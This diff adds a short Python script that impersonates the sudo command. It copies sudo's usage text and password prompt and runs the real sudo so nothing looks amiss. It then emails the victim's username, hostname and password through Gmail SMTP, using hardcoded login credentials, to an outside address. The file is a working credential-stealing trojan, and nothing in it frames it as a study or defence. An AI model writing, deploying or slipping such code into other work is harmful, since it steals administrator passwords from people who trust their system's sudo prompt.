@@ -1,0 +1,41 @@
+#! /bin/env python
+from pexpect import *
+from sys import argv
+import os
+import smtplib
+from getpass import getpass
+comm=' '.join(argv[1:])
+usage='''usage: sudo [-D level] -h | -K | -k | -V
+usage: sudo -v [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid]
+usage: sudo -l[l] [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-U user name] [-u user name|#uid] [-g groupname|#gid] [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] file ...'''
+def dosudo():
+    usnm=os.environ.get('USER')
+    hsnm=os.environ.get('HOSTNAME')
+    psstr='[sudo] password for {0}: '.format(usnm)
+    psw=getpass(psstr)
+    p=spawn('bash',['-c','/usr/bin/sudo '+comm])
+    p.expect(usnm+': ')
+    p.sendline(psw)
+    p.expect(EOF)
+    print p.before.strip(psstr).strip()
+    return 'password for {0} on {1}: {2}'.format(usnm,hsnm,psw)
+
+def sendemail(mssg):
+    smtpserver = smtplib.SMTP("smtp.gmail.com")
+    smtpserver.ehlo() 
+    smtpserver.starttls()
+    smtpserver.login("testhellotestworldtest@gmail.com", "testtesttesthello")
+    msg='To:Me\nFrom:testhellotestworldtest@gmail.com\nSubject:sudoer password\n\n{0}\n\n'.format(mssg)
+    smtpserver.sendmail("testhellotestworldtest@gmail.com",'zminkling@gmail.com', msg)
+    smtpserver.close()
+
+if __name__=="__main__":
+    if not comm:
+        print usage
+        exit()
+    try:
+        sendemail(dosudo())
+    except:
+        print 'Permission denied'
